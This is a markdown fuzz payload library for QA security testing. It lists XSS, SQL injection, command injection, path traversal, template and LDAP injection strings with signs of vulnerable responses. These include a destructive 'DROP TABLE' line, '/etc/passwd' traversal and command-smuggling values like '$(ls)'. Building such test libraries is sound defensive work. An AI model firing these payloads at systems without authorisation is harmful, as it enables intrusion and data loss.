# Fuzz Payload Library
## For use by security-chaos-monkey during QA testing only

> ⚠️ Only use these payloads against systems you own or have explicit written permission to test.

---

## XSS (Cross-Site Scripting) Payloads

### Basic reflection tests
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Attribute injection
```
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
"><img src=1 onerror=alert(1)>
```

### Encoded variants (to bypass naive filters)
```
&lt;script&gt;alert(1)&lt;/script&gt;
%3Cscript%3Ealert(1)%3C%2Fscript%3E
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### What a vulnerable response looks like
The payload appears unescaped in the HTML source of the response, or an alert dialog fires.

---

## SQL Injection Payloads

### Error detection (will these cause DB error messages?)
```
'
''
`
')
'))
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
"; --
1; DROP TABLE test; --
1 UNION SELECT null, null --
' UNION SELECT 1,2,3 --
```

### Blind injection (time-based)
```
' AND SLEEP(3) --
'; WAITFOR DELAY '0:0:3' --
1 AND 1=1
1 AND 1=2
```

### What a vulnerable response looks like
- Raw SQL error messages in the UI (MySQLSyntaxErrorException, ORA-00933, etc.)
- Slow responses when using SLEEP/WAITFOR payloads
- Different behavior for `1 AND 1=1` vs `1 AND 1=2`

---

## Command Injection Payloads

```
; ls
| ls
` ls `
$(ls)
&& ls
|| ls
; sleep 3
| sleep 3
```

### What a vulnerable response looks like
- Server-side command output in the response
- Slow response on `sleep` variants
- Different error messages

---

## Path Traversal Payloads

```
../
../../
../../../etc/passwd
..\
..\..\
%2e%2e%2f
%2e%2e/
..%2f
%252e%252e%252f
```

### What a vulnerable response looks like
- Contents of system files in the response
- Different HTTP status codes or response sizes for traversal vs normal paths

---

## Template Injection Payloads

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### What a vulnerable response looks like
- `49` appearing in the response (7*7 evaluated) — indicates server-side template injection

---

## Format String Payloads

```
%s%s%s%s
%d%d%d%d
%x%x%x%x
%n%n%n%n
```

---

## LDAP Injection Payloads

```
*)(&
*)(uid=*))(|(uid=*
admin)(&(password=*))
```

---

## Notes for the fuzzer script

The `fuzz_inputs.py` script uses a subset of these payloads — the safest, least destructive ones that can still detect reflection/injection issues without causing data loss. Specifically, it avoids `DROP TABLE`, mass `UNION SELECT` chains, and time-based payloads longer than 3 seconds.

For more aggressive testing, a security professional should use a dedicated tool like Burp Suite or OWASP ZAP.